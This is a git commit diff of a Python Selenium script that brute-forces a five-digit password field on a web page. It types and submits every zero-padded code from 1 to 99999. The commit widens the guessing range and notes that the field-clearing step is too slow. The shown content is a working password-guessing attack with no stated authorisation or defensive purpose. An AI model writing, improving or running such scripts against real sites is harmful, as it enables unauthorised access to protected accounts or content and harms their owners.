e5b64f5090845275bf669f5c2c7c8b7a79984927
Serhii Iljin <89367614+serhii-iljin@users.noreply.github.com>
2021-09-21 00:11:17 +0300

    Update main.py

--- main.py
+++ main.py
@@ -14,11 +14,11 @@ if __name__ == '__main__':
     time.sleep(2)
     passwordfield = browser.find_element(By.XPATH, "//*[@id=\"slide-password-wrapper-ca9b7634-e002-40f2-b6c3-cca0ad285c3d\"]/div/div/div/form/div/div[1]/input")
     time.sleep(2)
-    passwordfield.send_keys('00000')
+    passwordfield.send_keys('00000') 
     passwordfield.send_keys('\n')
     time.sleep(10)
     passwordfield.clear()
-    for i in range(34900, 100000):
+    for i in range(1, 100000):
         t = i
         c = 5
         while (t != 0):
@@ -28,7 +28,7 @@ if __name__ == '__main__':
             passwordfield.send_keys(0)
         passwordfield.send_keys(i)
         passwordfield.send_keys('\n')
-        time.sleep(0.5)
+        time.sleep(0.5)                   #TOO SLOW CLEARING METHOD. FIXED IN PATCH
         passwordfield.clear()
         passwordfield.clear()
         passwordfield.clear()
